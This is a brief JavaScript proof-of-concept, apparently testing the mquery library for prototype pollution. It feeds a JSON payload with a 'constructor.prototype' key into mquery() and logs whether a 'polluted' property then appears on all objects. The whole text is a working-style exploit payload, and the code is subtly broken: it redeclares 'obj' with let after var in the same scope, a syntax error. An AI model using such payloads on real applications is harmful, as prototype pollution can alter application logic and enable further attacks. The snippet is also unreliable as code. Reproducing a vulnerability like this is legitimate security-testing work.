var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
const mquery = require('mquery');
let obj = {};
var payload = JSON.parse('{"constructor.prototype": {"polluted":"yes"}}');
console.log({}.polluted);
var m = mquery(payload);
console.log({}.polluted);